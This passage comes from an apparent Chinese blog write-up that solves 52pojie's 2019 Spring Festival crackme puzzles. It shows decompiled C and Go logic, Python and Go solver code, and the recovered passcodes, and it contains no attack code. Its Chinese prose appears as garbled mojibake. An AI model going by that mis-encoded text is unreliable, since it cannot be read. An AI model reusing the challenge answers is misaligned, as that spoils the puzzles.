class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">encrypt</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *enc, <span class="keyword">int</span> key, <span class="keyword">int</span> num_3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *enc_0; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> length; <span class="comment">// kr04_4</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">char</span> c; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> alphabet[<span class="number">29</span>]; <span class="comment">// [esp+Bh] [ebp-1Dh]</span></span><br><span class="line">  <span class="keyword">char</span> tmp; <span class="comment">// [esp+30h] [ebp+8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;alphabet[<span class="number">1</span>], <span class="string">"abcdefghijklmnopqrstuvwxyz"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !key )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  enc_0 = enc;</span><br><span class="line">  <span class="keyword">if</span> ( !enc )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( num_3 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  length = <span class="built_in">strlen</span>(enc) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)(length - <span class="number">1</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v5 = key - (_DWORD)enc;</span><br><span class="line">  tmp = alphabet[num_3 + <span class="number">1</span>];</span><br><span class="line">  i = length - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    c = *enc_0;</span><br><span class="line">    <span class="keyword">if</span> ( *enc_0 &lt; tmp || c &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( c &gt;= <span class="number">97</span> &amp;&amp; c &lt;= alphabet[num_3] )</span><br><span class="line">        c = c - num_3 + <span class="number">26</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      c -= num_3;</span><br><span class="line">    &#125;</span><br><span class="line">    (enc_0++)[v5] = c;</span><br><span class="line">    --i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( i );</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°±æ˜¯å¯¹å­—ç¬¦ä¸²åˆ¤æ–­æ˜¯å¦ä¸ºå­—æ¯ï¼Œç„¶åæ ¹æ®å­—æ¯è¡¨<code>alphabet</code>åšæ˜ å°„å’ŒåŠ å‡ã€‚æ­£å‘å®ç°ä¸€ä¸‹è„šæœ¬å°±å¾—åˆ°å£ä»¤äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">enc = (<span class="string">'9102'</span> + <span class="string">'udhY'</span> + <span class="string">'zhNb'</span> + <span class="string">'ssdH'</span>)[::<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">print</span> enc</span><br><span class="line">alpha = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">num = <span class="number">3</span></span><br><span class="line">t = alpha[num + <span class="number">1</span>]</span><br><span class="line">i = len(enc)</span><br><span class="line">j = <span class="number">0</span></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">while</span> i != <span class="number">0</span>:</span><br><span class="line">    c = enc[j]</span><br><span class="line">    <span class="keyword">if</span> ord(c) &lt; ord(t) <span class="keyword">or</span> ord(c) &gt; <span class="number">122</span>:</span><br><span class="line">        <span class="keyword">if</span> ord(c) &gt;= <span class="number">97</span> <span class="keyword">and</span> ord(c) &lt;= ord(alpha[num]):</span><br><span class="line">            c = chr(ord(c) - num + <span class="number">26</span>)</span><br><span class="line">            <span class="keyword">if</span> ord(c) &gt; ord(alpha[<span class="number">-1</span>]):</span><br><span class="line">                c = chr(ord(c) - <span class="number">26</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        c = chr(ord(c) - num)</span><br><span class="line">    res += c</span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line">    i -= <span class="number">1</span></span><br><span class="line"><span class="keyword">print</span> res</span><br><span class="line"><span class="comment"># HappyNewYear2019</span></span><br></pre></td></tr></table></figure><p><img src="/pics/2019-å¾çˆ±ç ´è§£è§£é¢˜é¢†çº¢åŒ…æ´»åŠ¨/2.jpg" alt="ç¬¬äºŒå…³å£ä»¤"></p><h1 id="ã€æ˜¥èŠ‚ã€‘è§£é¢˜é¢†çº¢åŒ…ä¹‹ä¸‰"><a href="#ã€æ˜¥èŠ‚ã€‘è§£é¢˜é¢†çº¢åŒ…ä¹‹ä¸‰" class="headerlink" title="ã€æ˜¥èŠ‚ã€‘è§£é¢˜é¢†çº¢åŒ…ä¹‹ä¸‰"></a>ã€æ˜¥èŠ‚ã€‘è§£é¢˜é¢†çº¢åŒ…ä¹‹ä¸‰</h1><p>è¿™é“é¢˜æˆ‘æŸ¥äº†å£³ç„¶åä¸ä¼šè„±å°±ä¸€ç›´æ²¡åšã€‚çœ‹äº†<a href="https://mp.weixin.qq.com/s/R_mWqg2yt1HYkWq4CVbOPg" target="_blank" rel="noopener">writeup</a>å±…ç„¶æ˜¯ç›´æ¥è¿›idaå°±åˆ†æäº†ã€‚æœç´¢åˆ°mainå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main_main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// ST04_4</span></span><br><span class="line">  _DWORD *v1; <span class="comment">// ST04_4</span></span><br><span class="line">  _DWORD *v2; <span class="comment">// ST04_4</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// ST04_4</span></span><br><span class="line">  _DWORD *v4; <span class="comment">// ST04_4</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ST10_4</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ST14_4</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// ST18_4</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// ST04_4</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// ST0C_1</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [esp+0h] [ebp-7Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [esp+4h] [ebp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [esp+4h] [ebp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [esp+8h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [esp+Ch] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [esp+Ch] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [esp+Ch] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// [esp+Ch] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// [esp+10h] [ebp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// [esp+10h] [ebp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [esp+10h] [ebp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v22; <span class="comment">// [esp+14h] [ebp-68h]</span></span><br><span class="line">  <span class="keyword">int</span> v23; <span class="comment">// [esp+14h] [ebp-68h]</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// [esp+14h] [ebp-68h]</span></span><br><span class="line">  <span class="keyword">int</span> v25; <span class="comment">// [esp+14h] [ebp-68h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v26; <span class="comment">// [esp+18h] [ebp-64h]</span></span><br><span class="line">  <span class="keyword">int</span> v27; <span class="comment">// [esp+18h] [ebp-64h]</span></span><br><span class="line">  <span class="keyword">int</span> v28; <span class="comment">// [esp+1Ch] [ebp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> v29; <span class="comment">// [esp+1Ch] [ebp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> v30; <span class="comment">// [esp+20h] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v31; <span class="comment">// [esp+24h] [ebp-58h]</span></span><br><span class="line">  <span class="keyword">int</span> v32; <span class="comment">// [esp+28h] [ebp-54h]</span></span><br><span class="line">  <span class="keyword">int</span> v33; <span class="comment">// [esp+2Ch] [ebp-50h]</span></span><br><span class="line">  <span class="keyword">int</span> v34; <span class="comment">// [esp+2Ch] [ebp-50h]</span></span><br><span class="line">  _DWORD *v35; <span class="comment">// [esp+30h] [ebp-4Ch]</span></span><br><span class="line">  _DWORD *v36; <span class="comment">// [esp+34h] [ebp-48h]</span></span><br><span class="line">  _DWORD *v37; <span class="comment">// [esp+38h] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">int</span> *v38; <span class="comment">// [esp+3Ch] [ebp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> v39; <span class="comment">// [esp+40h] [ebp-3Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v40; <span class="comment">// [esp+44h] [ebp-38h]</span></span><br><span class="line">  <span class="keyword">void</span> *v41; <span class="comment">// [esp+48h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">int</span> *v42; <span class="comment">// [esp+4Ch] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">void</span> *v43; <span class="comment">// [esp+50h] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v44; <span class="comment">// [esp+54h] [ebp-28h]</span></span><br><span class="line">  _DWORD *v45; <span class="comment">// [esp+58h] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> *v46; <span class="comment">// [esp+5Ch] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">void</span> *v47; <span class="comment">// [esp+60h] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v48; <span class="comment">// [esp+64h] [ebp-18h]</span></span><br><span class="line">  _DWORD *v49; <span class="comment">// [esp+68h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> *v50; <span class="comment">// [esp+6Ch] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">void</span> *v51; <span class="comment">// [esp+70h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v52; <span class="comment">// [esp+74h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">void</span> *v53; <span class="comment">// [esp+78h] [ebp-4h]</span></span><br><span class="line">  <span class="keyword">void</span> *retaddr; <span class="comment">// [esp+7Ch] [ebp+0h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;retaddr &lt;= *(_DWORD *)(*(_DWORD *)__readfsdword(<span class="number">0x14</span>u) + <span class="number">8</span>) )</span><br><span class="line">    runtime_morestack_noctxt();</span><br><span class="line">  v52 = dword_4A04E0;</span><br><span class="line">  v53 = &amp;main_statictmp_0;</span><br><span class="line">  fmt_Println(&amp;v52, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  runtime_newobject(dword_4A04E0, v0);</span><br><span class="line">  v36 = v1;</span><br><span class="line">  runtime_newobject(dword_4A04E0, v1);</span><br><span class="line">  v37 = v2;</span><br><span class="line">  v50 = dword_4A04E0;</span><br><span class="line">  v51 = &amp;main_statictmp_1;</span><br><span class="line">  fmt_Print(&amp;v50, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  v48 = dword_498EE0;</span><br><span class="line">  v49 = v36;</span><br><span class="line">  fmt_Scanln(&amp;v48, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  v46 = dword_4A04E0;</span><br><span class="line">  v47 = &amp;main_statictmp_2;</span><br><span class="line">  fmt_Print(&amp;v46, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  v44 = dword_498EE0;</span><br><span class="line">  v45 = v37;</span><br><span class="line">  fmt_Scanln(&amp;v44, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  runtime_newobject(dword_4A90C0, v3);</span><br><span class="line">  v35 = v4;</span><br><span class="line">  *v4 = <span class="number">1732584193</span>;</span><br><span class="line">  v4[<span class="number">1</span>] = <span class="number">-271733879</span>;</span><br><span class="line">  v4[<span class="number">2</span>] = <span class="number">-1732584194</span>;</span><br><span class="line">  v4[<span class="number">3</span>] = <span class="number">271733878</span>;</span><br><span class="line">  v4[<span class="number">4</span>] = <span class="number">-1009589776</span>;</span><br><span class="line">  v4[<span class="number">21</span>] = <span class="number">0</span>;</span><br><span class="line">  v4[<span class="number">22</span>] = <span class="number">0</span>;</span><br><span class="line">  v4[<span class="number">23</span>] = <span class="number">0</span>;</span><br><span class="line">  runtime_stringtoslicebyte(<span class="number">0</span>, *v36, v36[<span class="number">1</span>]);</span><br><span class="line">  crypto_sha1___digest__Write(v35, v15, v19, v22, v19, v22);</span><br><span class="line">  crypto_sha1___digest__Sum(v35, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, v5, v6);</span><br><span class="line">  <span class="keyword">if</span> ( v26 &lt; <span class="number">0x10</span> )</span><br><span class="line">    runtime_panicslice(</span><br><span class="line">      v11,</span><br><span class="line">      v12,</span><br><span class="line">      v14,</span><br><span class="line">      v16,</span><br><span class="line">      v20,</span><br><span class="line">      v23,</span><br><span class="line">      v26,</span><br><span class="line">      v28,</span><br><span class="line">      v30,</span><br><span class="line">      v31,</span><br><span class="line">      v32,</span><br><span class="line">      v33,</span><br><span class="line">      v35,</span><br><span class="line">      v36,</span><br><span class="line">      v37,</span><br><span class="line">      v38,</span><br><span class="line">      v39,</span><br><span class="line">      v40,</span><br><span class="line">      v41,</span><br><span class="line">      v42,</span><br><span class="line">      v43,</span><br><span class="line">      v44,</span><br><span class="line">      v45,</span><br><span class="line">      v46,</span><br><span class="line">      v47,</span><br><span class="line">      v48,</span><br><span class="line">      v49,</span><br><span class="line">      v50,</span><br><span class="line">      v51,</span><br><span class="line">      v52,</span><br><span class="line">      v53);</span><br><span class="line">  v34 = v20;</span><br><span class="line">  encoding_base64___Encoding__DecodeString(encoding_base64_StdEncoding, *v37, v37[<span class="number">1</span>], v16, v20, v23, v26);</span><br><span class="line">  <span class="keyword">if</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    v42 = dword_4A04E0;</span><br><span class="line">    v43 = &amp;main_statictmp_3;</span><br><span class="line">    result = fmt_Println(&amp;v42, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    main_AesDecrypt(v17, v21, v24, v34, <span class="number">16</span>, <span class="number">16</span>, <span class="number">0</span>, v28);</span><br><span class="line">    <span class="keyword">if</span> ( v31 )</span><br><span class="line">    &#123;</span><br><span class="line">      v40 = dword_4A04E0;</span><br><span class="line">      v41 = &amp;main_statictmp_4;</span><br><span class="line">      result = fmt_Println(&amp;v40, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v29 == <span class="number">26</span> &amp;&amp; (runtime_memequal(v27, dword_4B8A80, <span class="number">26</span>, v18), v10) )</span><br><span class="line">        fmt_Printf(dword_4BCC04, <span class="number">73</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, v25, v27, <span class="number">26</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        fmt_Printf(&amp;word_4B84CE, <span class="number">24</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, v25, v27, v29);</span><br><span class="line">      runtime_newobject(dword_4A04E0, v13);</span><br><span class="line">      v38 = dword_498EE0;</span><br><span class="line">      v39 = v8;</span><br><span class="line">      result = fmt_Scanln(&amp;v38, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤§æ¦‚å¯ä»¥æ¨æµ‹ï¼Œå…ˆè¿›è¡Œbase64ï¼Œç„¶åaesè§£å¯†ï¼Œæœ€åå’Œæ•°æ®æ®µä¸­ä¸€ä¸²é•¿åº¦ä¸º26çš„å­—ç¬¦ä¸²æ¯”è¾ƒã€‚å…·ä½“å­—ç¬¦ä¸²æˆ‘ä»¬å¯ä»¥dumpå‡ºæ¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="number">0x48</span>, <span class="number">0x61</span>, <span class="number">0x70</span>, <span class="number">0x70</span>, <span class="number">0x79</span>, <span class="number">0x4E</span>, <span class="number">0x65</span>, <span class="number">0x77</span>, <span class="number">0x59</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x72</span>, <span class="number">0x46</span>, <span class="number">0x72</span>, <span class="number">0x6F</span>, <span class="number">0x6D</span>, <span class="number">0x35</span>, <span class="number">0x32</span>, <span class="number">0x50</span>, <span class="number">0x6F</span>, <span class="number">0x4A</span>, <span class="number">0x69</span>, <span class="number">0x65</span>, <span class="number">0x2E</span>, <span class="number">0x43</span>, <span class="number">0x6E</span>, <span class="number">0x4C</span>, <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x65</span>, <span class="number">0x20</span>, <span class="number">0x49</span>, <span class="number">0x73</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x6E</span>, <span class="number">0x64</span>, <span class="number">0x73</span>, <span class="number">0x20</span>, <span class="number">0x53</span>, <span class="number">0x74</span>, <span class="number">0x61</span>, <span class="number">0x6E</span>, <span class="number">0x64</span>, <span class="number">0x61</span>, <span class="number">0x72</span>, <span class="number">0x64</span>, <span class="number">0x20</span>, <span class="number">0x54</span>, <span class="number">0x69</span>, <span class="number">0x6D</span>, <span class="number">0x65</span>, <span class="number">0x4E</span>, <span class="number">0x65</span>, <span class="number">0x77</span>, <span class="number">0x66</span>, <span class="number">0x6F</span>, <span class="number">0x75</span>, <span class="number">0x6E</span>, <span class="number">0x64</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x6E</span>, <span class="number">0x64</span>, <span class="number">0x20</span>, <span class="number">0x53</span>, <span class="number">0x74</span>, <span class="number">0x61</span>, <span class="number">0x6E</span>, <span class="number">0x64</span>, <span class="number">0x61</span>, <span class="number">0x72</span>, <span class="number">0x64</span>, <span class="number">0x20</span>, <span class="number">0x54</span>, <span class="number">0x69</span>]</span><br><span class="line">output = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">  output += chr(data[i])</span><br><span class="line"><span class="keyword">print</span> output</span><br><span class="line"><span class="comment"># HappyNewYearFrom52PoJie.Cn</span></span><br></pre></td></tr></table></figure><p>è°ƒè¯•ä¸­å¯ä»¥ä»å†…å­˜é‡Œdumpåˆ°<code>EF2D8BFA0C30AB270B92CC73A563AFA3</code>å…¶å®è¿™ä¸€ä¸²æ•°æ®å°±æ˜¯<code>uid</code>å¯¹åº”çš„<code>sha1</code>æ•£åˆ—å€¼<code>ef2d8bfa0c30ab270b92cc73a563afa3b04faa75</code>çš„å­—èŠ‚æ•°ç»„å½¢å¼ï¼Œå–å‰16ä½AESåŠ å¯†æ–¹å¼ä¸º<code>CBC</code>ï¼ˆ<code>main_AesDecrypt</code>å‡½æ•°ä¸­å¯ä»¥ç›´æ¥çœ‹å‡ºï¼‰ï¼Œè¡¥ç æ–¹å¼ä¸º<code>PKCS5Padding</code>ï¼ˆ<code>AES</code>è§£å¯†é”™è¯¯æ—¶ï¼Œä¼šé€€å‡ºç¨‹åºï¼Œä½†æ˜¯æœ‰å¼‚å¸¸ä¿¡æ¯ä¸€é—ªè€Œè¿‡ï¼Œç»™æŠ¥é”™å‡½æ•°ä¸‹æ–­ç‚¹å³å¯æŸ¥çœ‹å¼‚å¸¸ä¿¡æ¯ï¼‰æ‰€ä»¥æŠŠ<code>EF2D8BFA0C30AB270B92CC73A563AFA3</code>è½¬åŒ–æˆå­—èŠ‚æ•°ç»„ï¼Œä½¿ç”¨<code>AES/CBC/PKCS5Padding</code>æ–¹å¼åŠ å¯†<code>HappyNewYearFrom52PoJie.Cn</code>ï¼Œå†è¿›è¡Œbase64åŠ å¯†å°±å¯å¾—åˆ°å£ä»¤ã€‚</p><p>goè¯­è¨€å®ç°ä»£ç ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"bytes"</span></span><br><span class="line">    <span class="string">"crypto/cipher"</span></span><br><span class="line">    <span class="string">"crypto/sha1"</span></span><br><span class="line">    <span class="string">"crypto/aes"</span></span><br><span class="line">    <span class="string">"encoding/base64"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PKCS5Padding</span><span class="params">(ciphertext []<span class="keyword">byte</span>, blockSize <span class="keyword">int</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">    padding := blockSize - <span class="built_in">len</span>(ciphertext)%blockSize</span><br><span class="line">    padtext := bytes.Repeat([]<span class="keyword">byte</span>&#123;<span class="keyword">byte</span>(padding)&#125;, padding)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">append</span>(ciphertext, padtext...)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PKCS5UnPadding</span><span class="params">(origData []<span class="keyword">byte</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">    length := <span class="built_in">len</span>(origData)</span><br><span class="line">    unpadding := <span class="keyword">int</span>(origData[length<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">return</span> origData[:(length - unpadding)]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AesEncrypt</span><span class="params">(origData, key []<span class="keyword">byte</span>)</span> <span class="params">([]<span class="keyword">byte</span>, error)</span></span> &#123;</span><br><span class="line">    block, err := aes.NewCipher(key)</span><br><span class="line">    